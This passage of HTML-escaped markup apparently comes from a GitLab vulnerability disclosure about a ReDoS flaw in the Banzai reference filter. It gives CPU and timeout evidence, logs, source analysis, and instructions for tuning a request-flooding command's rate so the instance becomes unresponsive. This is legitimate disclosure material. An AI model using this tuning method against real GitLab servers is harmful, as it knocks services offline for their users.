href=\&quot;https://user-content.gitlab-static.net/83a86d94b9a52965bb7e89a661519d599ffc1f10/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33303536323261342d393365362d346232372d383035622d6331303762303632666432342f68746f705f616c6c5f636f7265735f6578686175737465642e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;67:1-67:126\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;htop_all_cores_exhausted.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/305622a4-93e6-4b27-805b-c107b062fd24/htop_all_cores_exhausted.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/83a86d94b9a52965bb7e89a661519d599ffc1f10/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33303536323261342d393365362d346232372d383035622d6331303762303632666432342f68746f705f616c6c5f636f7265735f6578686175737465642e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;69:1-69:327\&quot; dir=\&quot;auto\&quot;\u003eIn an instance with performance close to the \u003ca data-sourcepos=\&quot;69:46-69:186\&quot; href=\&quot;https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e1k Reference Architecture (with 8 CPU cores, 7.2GB memory)\u003c/a\u003e, this CPU resource consumption causes noticeable performance degradation in tens of seconds, and visibly delays response to all other users.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;71:1-71:106\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/35143e47a1493218fed89a75151b9a47f856f728/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61636238373635632d373434352d346363322d396361362d6564656536396263343366322f726573706f6e73655f64656c61792e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;71:1-71:106\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;response_delay.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/acb8765c-7445-4cc2-9ca6-edee69bc43f2/response_delay.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/35143e47a1493218fed89a75151b9a47f856f728/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61636238373635632d373434352d346363322d396361362d6564656536396263343366322f726573706f6e73655f64656c61792e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;73:1-73:151\&quot; dir=\&quot;auto\&quot;\u003eUnless the crafted command is interrupted, this performance degradation will continue and get worse until the instance becomes completely unresponsive.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;75:1-75:161\&quot; dir=\&quot;auto\&quot;\u003e\u003cem data-sourcepos=\&quot;75:1-75:161\&quot;\u003eNOTE: If you can confirm a surge in CPU usage at step 11, that&#39;s enough confirmation that this bug is a valid ReDoS vulnerability, based on past valid reports.\u003c/em\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;77:1-77:161\&quot; dir=\&quot;auto\&quot;\u003e\u003cem data-sourcepos=\&quot;77:1-77:161\&quot;\u003eNOTE 2: This crafted command will keep sending requests until you force it to stop. Please be sure to terminate the command after confirming the vulnerability.\u003c/em\u003e\u003c/p\u003e\u0026#x000A;\u003ch6 data-sourcepos=\&quot;79:1-79:58\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-details-about-the-command-constructed-in-step-9\&quot; class=\&quot;anchor\&quot; href=\&quot;#details-about-the-command-constructed-in-step-9\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDetails about the command constructed in step 9:\u003c/h6\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;80:1-81:218\&quot; dir=\&quot;auto\&quot;\u003eThe executed command send 1 request per second, and each 1 request that triggers ReDoS exhaust the resources of 1 CPU core.\u003cbr data-sourcepos=\&quot;80:126-80:126\&quot;\u003e\u0026#x000A;The GitLab instance has the default timeout of 60 seconds per request. However, because the load per request is too high, there are many worker processes that do not finish processing even after the timeout has passed.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;84:1-84:84\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-additional-informations-to-confirm-this-vulnerability-meets-the-ah-criteria\&quot; class=\&quot;anchor\&quot; href=\&quot;#additional-informations-to-confirm-this-vulnerability-meets-the-ah-criteria\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eAdditional informations to confirm this vulnerability meets the \u003ccode data-sourcepos=\&quot;84:72-84:74\&quot;\u003eA:H\u003c/code\u003e criteria\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;86:1-86:284\&quot; dir=\&quot;auto\&quot;\u003e\u003cstrong data-sourcepos=\&quot;86:1-86:284\&quot;\u003e\u003cem data-sourcepos=\&quot;86:3-86:282\&quot;\u003eIMPORTANT NOTE: This section contains additional information to confirm that this vulnerability meets the criteria for \u003ccode data-sourcepos=\&quot;86:124-86:126\&quot;\u003eA:H\u003c/code\u003e. Please use this information after triage, as this section contains time-consuming steps and may be an over-verification of whether this report is valid.\u003c/em\u003e\u003c/strong\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;88:1-90:69\&quot; dir=\&quot;auto\&quot;\u003eIf the GitLab instance is attacked at a well-tuned RPS(requests per second) rate for a reasonable amount of time, then as long as the attack continues, the instance will take 60+ seconds to process every single request.\u003cbr data-sourcepos=\&quot;88:222-88:222\&quot;\u003e\u0026#x000A;This indicates that timeouts are not working well under heavy load.\u003cbr data-sourcepos=\&quot;89:70-89:70\&quot;\u003e\u0026#x000A;As a result, \u003ccode data-sourcepos=\&quot;90:15-90:23\&quot;\u003e500 error\u003c/code\u003e will be returned for each and every request.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;92:1-92:96\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/75416d175746901d20551cf6f9756d1f3c506ef0/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61383434313037362d326665352d343936342d393937332d3362613762333530646333642f3530305f6572726f722e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;92:1-92:96\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;500_error.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/a8441076-2fe5-4964-9973-3ba7b350dc3d/500_error.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/75416d175746901d20551cf6f9756d1f3c506ef0/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61383434313037362d326665352d343936342d393937332d3362613762333530646333642f3530305f6572726f722e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;94:1-94:182\&quot; dir=\&quot;auto\&quot;\u003eI describe below how to attack at a well-tuned RPS rate for a reasonable amount of time \u003cstrong data-sourcepos=\&quot;94:89-94:166\&quot;\u003eby using the command constructed in step 9 of \&quot;Steps to reproduce\&quot; section\u003c/strong\u003e of this report.\u003c/p\u003e\u0026#x000A;\u003col data-sourcepos=\&quot;96:1-112:0\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;96:1-97:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;96:4-96:225\&quot;\u003eBefore running the constructed command, maintain separate session as an authenticated user by signing into the instance with a different browser than the one that obtained the unauthenticated user&#39;s CSRF token and session.\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;98:1-105:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;98:4-100:131\&quot;\u003eIterate on executing the constructed command and adjusting the RPS rate.\u003cbr data-sourcepos=\&quot;98:78-98:78\&quot;\u003e\u0026#x000A;The constructed command will display the PIDs of the spawned \u003ccode data-sourcepos=\&quot;99:66-99:69\&quot;\u003ecurl\u003c/code\u003e processes and the responses from the instance in the console.\u003cbr data-sourcepos=\&quot;99:135-99:135\&quot;\u003e\u0026#x000A;Please adjust the RPS rate as described below so that 1 or 2 PIDs and several \u003ccode data-sourcepos=\&quot;100:83-100:91\&quot;\u003e500 error\u003c/code\u003e responses are alternately displayed.\u003c/p\u003e\u0026#x000A;\u003cul data-sourcepos=\&quot;101:4-103:0\&quot;\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;101:4-101:234\&quot;\u003eWe can adjust the RPS rate by changing the \u003ccode data-sourcepos=\&quot;101:50-101:54\&quot;\u003esleep\u003c/code\u003e value at the end of the command. For example, changing to \u003ccode data-sourcepos=\&quot;101:116-101:123\&quot;\u003esleep 1;\u003c/code\u003e will result in \u003ccode data-sourcepos=\&quot;101:142-101:148\&quot;\u003eRPS = 1\u003c/code\u003e, \u003ccode data-sourcepos=\&quot;101:153-101:162\&quot;\u003esleep 0.5;\u003c/code\u003e will result in \u003ccode data-sourcepos=\&quot;101:181-101:187\&quot;\u003eRPS = 2\u003c/code\u003e, and \u003ccode data-sourcepos=\&quot;101:196-101:203\&quot;\u003esleep 2;\u003c/code\u003e will result in \u003ccode data-sourcepos=\&quot;101:222-101:230\&quot;\u003eRPS = 0.5\u003c/code\u003e.\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;102:4-103:0\&quot;\u003eWe need to adjust the RPS rate so that \u003ca data-sourcepos=\&quot;102:45-102:202\&quot; href=\&quot;https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003eit does not exceed the \&quot;Test RPS rates\&quot; (discribed in \&quot;Clarifying notes\&quot;)\u003c/a\u003e. As an example, for the \u003ca data-sourcepos=\&quot;102:228-102:335\&quot; href=\&quot;https://docs.gitlab.com/ee/administration/reference_architectures/1k_users.html\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e1k Reference Architecture\u003c/a\u003e, \&quot;Test RPS rates\&quot; is 2 RPS.\u003c/li\u003e\u0026#x000A;\u003c/ul\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;104:4-104:321\&quot;\u003e\u003cem data-sourcepos=\&quot;104:4-104:321\&quot;\u003eNOTE: Since the default timeout is 60 seconds, we need to wait a few minutes after executing the command to see the PID and error response alternately displayed. There is no problem if the PIDs is displayed continuously occasionally, but if it is clearly not working, please stop the command and adjust the RPS rate.\u003c/em\u003e\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003cli data-sourcepos=\&quot;106:1-112:0\&quot;\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;106:4-108:180\&quot;\u003e\u003cstrong data-sourcepos=\&quot;106:4-106:43\&quot;\u003eWith the tuned command still running\u003c/strong\u003e, visit any page on the instance with the authenticated user&#39;s session maintained in step 1 of this section.\u003cbr data-sourcepos=\&quot;106:154-106:154\&quot;\u003e\u0026#x000A;And check if the \u003ccode data-sourcepos=\&quot;107:22-107:30\&quot;\u003e500 error\u003c/code\u003e is returned after a response delay of 60+ seconds.\u003cbr data-sourcepos=\&quot;107:85-107:85\&quot;\u003e\u0026#x000A;After you start getting \u003ccode data-sourcepos=\&quot;108:29-108:38\&quot;\u003e500 errors\u003c/code\u003e for authenticated requests, wait tens of minutes and you&#39;ll start getting \u003ccode data-sourcepos=\&quot;108:116-108:125\&quot;\u003e500 errors\u003c/code\u003e for unauthenticated requests and requests to the API.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;110:4-110:144\&quot;\u003e\u003cem data-sourcepos=\&quot;110:4-110:144\&quot;\u003eNOTE: This behavior seems to occur because handling authenticated requests tends to be more complex than handling unauthenticated requests.\u003c/em\u003e\u003c/p\u003e\u0026#x000A;\u003c/li\u003e\u0026#x000A;\u003c/ol\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;113:1-114:214\&quot; dir=\&quot;auto\&quot;\u003eWhen I tested it on my instance, it took about 10-20 minutes at a rate of 1 RPS for my instance (16 CPU cores and 32GB of memory) to reach the above DoS state.\u003cbr data-sourcepos=\&quot;113:162-113:162\&quot;\u003e\u0026#x000A;Additionally, in a pipeline that started overlapping the above DoS state, the jobs failed with timeout because the runner was unable to communicate with the instance, and subsequent job on the pipeline was not run.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;116:1-117:116\&quot; dir=\&quot;auto\&quot;\u003e\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/18951d43279a2b0a1b317d05a6a5379fbb940e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62666466343338652d373064632d343937662d386336652d3335303733353961376265632f6661696c65645f706970656c696e652e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;116:1-116:108\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;failed_pipeline.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/bfdf438e-70dc-497f-8c6e-3507359a7bec/failed_pipeline.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/18951d43279a2b0a1b317d05a6a5379fbb940e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62666466343338652d373064632d343937662d386336652d3335303733353961376265632f6661696c65645f706970656c696e652e706e67\&quot;\u003e\u003c/a\u003e\u003cbr data-sourcepos=\&quot;116:111-116:111\&quot;\u003e\u0026#x000A;\u003ca class=\&quot;no-attachment-icon\&quot; href=\&quot;https://user-content.gitlab-static.net/b3611e2c1bd40b68c42e504160c69cde68f081e7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30636637653965632d316237632d343562652d396165342d3037376563386431336562632f6661696c65645f6a6f62735f74696d656f75742e706e67\&quot; target=\&quot;_blank\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png\&quot;\u003e\u003cimg data-sourcepos=\&quot;117:1-117:116\&quot; src=\&quot;data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==\&quot; alt=\&quot;failed_jobs_timeout.png\&quot; data-canonical-src=\&quot;https://h1.sec.gitlab.net/a/0cf7e9ec-1b7c-45be-9ae4-077ec8d13ebc/failed_jobs_timeout.png\&quot; decoding=\&quot;async\&quot; class=\&quot;lazy\&quot; data-src=\&quot;https://user-content.gitlab-static.net/b3611e2c1bd40b68c42e504160c69cde68f081e7/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30636637653965632d316237632d343562652d396165342d3037376563386431336562632f6661696c65645f6a6f62735f74696d656f75742e706e67\&quot;\u003e\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;119:1-119:116\&quot; dir=\&quot;auto\&quot;\u003eAlso, when I looked at the runner logs in this state, I could see that the runner was failing to pick up the jobs.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;120:1-127:5\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e$ sudo docker logs my_runner_container  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e[...snip...]  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003eWARNING: Checking for jobs... failed                runner=REDACTED status=POST http://my-gitlab-h1.test/api/v4/jobs/request: 500 Internal Server Error  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;128:1-128:192\&quot; dir=\&quot;auto\&quot;\u003e(Since I was using the \u003ca data-sourcepos=\&quot;128:24-128:126\&quot; href=\&quot;https://docs.gitlab.com/runner/install/docker.html#docker-images\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e\u003ccode data-sourcepos=\&quot;128:26-128:52\&quot;\u003egitlab/gitlab-runner:alpine\u003c/code\u003e image\u003c/a\u003e for testing, I ran \u003ccode data-sourcepos=\&quot;128:148-128:158\&quot;\u003edocker logs\u003c/code\u003e command to see the runner logs.)\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;130:1-130:195\&quot; dir=\&quot;auto\&quot;\u003eThese mean that the instance has been completely taken down, so this vulnerability fully meets \u003ca data-sourcepos=\&quot;130:96-130:194\&quot; href=\&quot;https://gitlab-com.gitlab.io/gl-security/appsec/cvss-calculator/#clarifying-notes\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e\u003ccode data-sourcepos=\&quot;130:98-130:100\&quot;\u003eA:H\u003c/code\u003e criteria\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;133:1-133:39\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-what-is-the-current-bug-behavior\&quot; class=\&quot;anchor\&quot; href=\&quot;#what-is-the-current-bug-behavior\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eWhat is the current bug behavior?\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;135:1-136:95\&quot; dir=\&quot;auto\&quot;\u003eAlthough the behavior of this ReDoS bug isn&#39;t overly complicated, it&#39;s a bit tedious to get to the root cause from the observed DoS state.\u003cbr data-sourcepos=\&quot;135:141-135:141\&quot;\u003e\u0026#x000A;So I would like to explain this bug step by step by looking at the stack trace and source code.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;138:1-138:124\&quot; dir=\&quot;auto\&quot;\u003eLooking at the stack trace at timeout, at first glance \u003ccode data-sourcepos=\&quot;138:57-138:78\&quot;\u003eProjectReferenceFilter\u003c/code\u003e does not seem to be the cause of this bug.\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;139:1-146:3\&quot; class=\&quot;code highlight js-syntax-highlight language-plaintext\&quot; lang=\&quot;plaintext\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:209:in `replace_text_when_pattern_matches&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:50:in `block in call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:48:in `each&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:48:in `each_with_index&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003elib/banzai/filter/references/reference_filter.rb:48:in `call&#39;  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;plaintext\&quot;\u003e(...snip...)  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;148:1-148:79\&quot; dir=\&quot;auto\&quot;\u003eLet&#39;s look at the line 209 in \u003ccode data-sourcepos=\&quot;148:32-148:50\&quot;\u003ereference_filter.rb\u003c/code\u003e where the timeout occurred.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;150:1-150:115\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L208-209\&quot;\u003ehttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L208-209\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;151:1-154:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003ereplace_text_when_pattern_matches\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003enode\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eindex\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epattern\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e          \u003cspan class=\&quot;k\&quot;\u003ereturn\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003eunless\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003enode\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003etext\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=~\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epattern\u003c/span\u003e  \u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;156:1-157:112\&quot; dir=\&quot;auto\&quot;\u003eThere is no doubt that a ReDoS has occurred because of \u003ccode data-sourcepos=\&quot;156:57-156:76\&quot;\u003enode.text =~ pattern\u003c/code\u003e.\u003cbr data-sourcepos=\&quot;156:81-156:81\&quot;\u003e\u0026#x000A;Let&#39;s take a look at the code on line 50 that calls \u003ccode data-sourcepos=\&quot;157:54-157:103\&quot;\u003eReferenceFilter::replace_text_when_pattern_matches\u003c/code\u003e method.\u003c/p\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;159:1-159:113\&quot; dir=\&quot;auto\&quot;\u003e\u003ca href=\&quot;https://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L45-50\&quot;\u003ehttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.11.0-ee/lib/banzai/filter/references/reference_filter.rb#L45-50\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;160:1-167:3\&quot; data-canonical-lang=\&quot;ruby\&quot; class=\&quot;code highlight js-syntax-highlight language-ruby\&quot; lang=\&quot;ruby\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e        \u003cspan class=\&quot;k\&quot;\u003edef\u003c/span\u003e \u003cspan class=\&quot;nf\&quot;\u003ecall\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e          \u003cspan class=\&quot;n\&quot;\u003eref_pattern_start\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;sr\&quot;\u003e/\\A\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e#{\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eobject_reference_pattern\u003c/span\u003e\u003cspan class=\&quot;si\&quot;\u003e}\u003c/span\u003e\u003cspan class=\&quot;sr\&quot;\u003e\\z/\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e          \u003cspan class=\&quot;n\&quot;\u003enodes\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e.\u003c/span\u003e\u003cspan class=\&quot;nf\&quot;\u003eeach_with_index\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003edo\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e|\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003enode\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eindex\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e|\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e            \u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003etext_node?\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003enode\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e  \u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;ruby\&quot;\u003e              \u003cspan class=\&quot;n\&quot;\u003ereplace_text_when_pattern_matches\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003enode\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eindex\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eobject_reference_pattern\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e \u003cspan 